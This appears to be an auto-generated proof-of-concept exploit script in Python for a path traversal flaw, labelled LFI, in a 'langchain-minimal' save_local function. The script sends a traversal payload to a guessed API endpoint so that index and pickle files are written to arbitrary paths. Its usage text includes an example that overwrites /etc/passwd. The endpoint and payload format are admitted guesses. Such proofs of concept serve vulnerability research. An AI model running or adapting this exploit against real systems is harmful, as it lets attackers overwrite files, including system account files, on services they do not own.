#!/usr/bin/env python3
# PoC for langchain-minimal (/tmp/langchain-minimal)
# Path: lfi-000
# Sink: save_local
# Auto-generated — run with: python3 lfi_folder_then_index_name_save_local.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in langchain-minimal's save_local function.

Vulnerability: Path traversal in folder_path parameter allows writing files to arbitrary locations.
The function uses Path(folder_path) directly without sanitization, enabling directory traversal.

Impact: An attacker can write arbitrary files (FAISS index and pickle files) to any location
the process has write access to.

Usage:
    python3 exploit.py --target http://victim:8000 --folder_path ../../../tmp/evil --index_name poc
"""

import argparse
import sys
import requests
import json

def exploit(target_url: str, folder_path: str, index_name: str) -> None:
    """
    Exploit the path traversal vulnerability in save_local.
    
    Args:
        target_url: Base URL of the vulnerable service
        folder_path: Path traversal payload (e.g., ../../../tmp/evil)
        index_name: Name for the index files to be written
    """
    # Construct the API endpoint (assuming standard FastAPI/Flask endpoint)
    # The actual endpoint may vary - adjust based on the target application
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"
    
    # Payload structure - adjust based on actual API contract
    # The untrusted_user_input parameter is passed to save_local
    payload = {
        "untrusted_user_input": json.dumps({
            "folder_path": folder_path,
            "index_name": index_name
        })
    }
    
    print(f"[*] Target: {endpoint}")
    print(f"[*] Attempting path traversal with folder_path: {folder_path}")
    print(f"[*] Index name: {index_name}")
    
    try:
        # Send the malicious request
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        if response.status_code == 200:
            print("[+] Request succeeded - files may have been written")
            print(f"[*] Expected files: {folder_path}/{index_name}.faiss")
            print(f"[*] Expected files: {folder_path}/{index_name}.pkl")
        else:
            print("[-] Request failed - check target and payload")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed to {target_url}")
        print("[*] Ensure the target service is running and accessible")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-minimal save_local",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic path traversal to /tmp
  python3 exploit.py --target http://localhost:8000 --folder_path ../../../tmp/evil --index_name poc
  
  # Overwrite a sensitive file (dangerous - use with caution)
  python3 exploit.py --target http://localhost:8000 --folder_path ../../../etc --index_name passwd
        """
    )
    
    parser.add_argument(
        "--target",
        required=True,
        help="Target URL (e.g., http://victim:8000)"
    )
    parser.add_argument(
        "--folder_path",
        default="../../../tmp/poc_test",
        help="Path traversal payload (default: ../../../tmp/poc_test)"
    )
    parser.add_argument(
        "--index_name",
        default="poc_success",
        help="Index file name (default: poc_success)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("langchain-minimal LFI PoC Exploit")
    print("=" * 60)
    print()
    
    # Benign default - writes to /tmp/poc_test/poc_success.faiss and .pkl
    # Change to more dangerous paths only if you understand the risks
    exploit(args.target, args.folder_path, args.index_name)
    
    print()
    print("[*] Exploit completed")
    print("[*] Check the target filesystem for written files")
    print("[*] To verify: ls -la /tmp/poc_test/ (or your custom path)")

if __name__ == "__main__":
    main()
